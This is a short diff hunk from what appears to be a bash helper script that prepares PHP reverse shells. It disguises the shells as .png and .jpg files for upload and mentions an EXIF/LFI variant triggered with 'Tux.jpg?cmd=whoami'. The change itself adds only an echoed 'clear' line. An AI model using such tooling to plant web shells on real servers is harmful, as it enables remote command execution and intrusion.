@@ -216,6 +216,7 @@ function menu {
       echo "cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.png"
       echo "cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.jpg"
       echo "export directory=$(pwd)"
+      echo "clear"
       echo "echo Your shells will be located in \$directory/php-reverse-shell.php with the reverse connection IP $myip"
       echo ""
       echo -e "\033[34mNow we will create an exif variant/lfi variant. When uploaded use Tux.jpg?cmd=whoami\033[0m"
